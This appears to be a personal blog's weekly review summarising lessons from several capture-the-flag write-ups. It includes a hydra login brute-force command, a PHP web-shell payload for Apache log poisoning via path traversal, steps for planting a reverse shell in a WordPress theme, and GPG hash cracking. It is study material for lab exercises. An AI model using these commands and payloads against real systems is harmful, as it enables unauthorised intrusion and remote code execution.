---
title: Weekly Review 1
date: 2023-10-08
categories: [Review]
tags: [hydra, interactiveshell, wordpress, containerescape, logpoisoning]
img_path: /assets/review/
mermaid: true
---
> This is an overview of what I learned through the week, mostly things I encountered for the first time or simply wanted to revise.

## [Mr Robot](https://cspanias.github.io/posts/Mr-Robot-Write-Up-(2023)/) 

### Dictionary Attack with hydra

1. Login with random creds and check for login **error message**. 
2. Capture POST request with Burp and get its **params**.
3. Try building a **username list** by using static pass.
4. If user(s) found, try the reverse to **crack pass**. 

 ```shell
 hydra -L <username_list> -p <static_pass> <target-ip> http-post-form "/<login_dir>:log=^USER^&pwd=^PASS^:F=<error message>" -t 30
 ```


### RCE on WordPpress

 1. We need admin acc for accessing Appearance --> **Editor**.
 2. Replance an appropriate, i.e. least used, Editor PHP script with reverse shell code. 

## Interactive terminal with Python


 ```shell
 python -c 'import pty;pty.spawn("/bin/bash");'
 ```


## [Dogcat](https://cspanias.github.io/posts/Dogcat-Write-Up-(2023)/)
 
### Log Poisoning
 
 1. **NULL Byte** usage: `%00` / `&`.
 2. If a `../` attack is possible in an Apache web server, we can target its **log file**, usually, under `/var/log/apache2/access.log`.
 3. Modify the **User-Agent** of the captured request by replacing it with code accepting commands:
 ```PHP
 <?php system($_GET['c']); ?>
 ```
 4. Now we can execute commands such as `/access.log&ext&c=<command>`, checking the output in the HTTP response.
 5. Run Metasploit's **web delivery** module, and pass the output as command.
   
### Container Escape  
 
 1. Check ```hostname```. 
 2. To break out we need to find a way to launch a reverse shell from the current env (Inception concept).
   
## [Nax](https://cspanias.github.io/posts/Nax-Write-Up-(2023)/)  
   
### Nagios XI  
 
 Boosted Crontab used in DevOps for monitoring and generating alerts when something goes wrong (`/nagiosxi`).
   
### Piet Programming Language  
 
 We can pass it `.ppm` files and get back chars.
 
## [Git Happens](https://cspanias.github.io/posts/Git-Happens-Write-Up-(2023)/)
   
### GitTools  
   
 We can download and manipulate public-facing repos (`/.git`) with GitTools.
   
### Chaining commands
   
 ```shell
 # use " " as delimiter and pick the second field
 cut -d " " -f2
 
 # converts standard input into args to a command
 xargs
 ```
   
## [Tomghost](https://cspanias.github.io/posts/Tomghost-Write-Up-(2023)/)  
   
### Apache Tomcat  
   
 Apache Tomacat is a **web container** that can also be used as an HTTP(S) server. **Ghostcast** is a known vuln: if the *Apache Jserv Protocol (AJP)* is exposed (port 8009), we can read files from Tomcat's dirs. 
   
### GPG Encryption
   
GPG is a file encryption tool. 
```shell
# decrypt file
gpg -d <file.pgp>

# gpg file for John
gpg2john <file.asc> > new_file

# in case we need to pass a key to gpg
gpg --import <file.asc>
```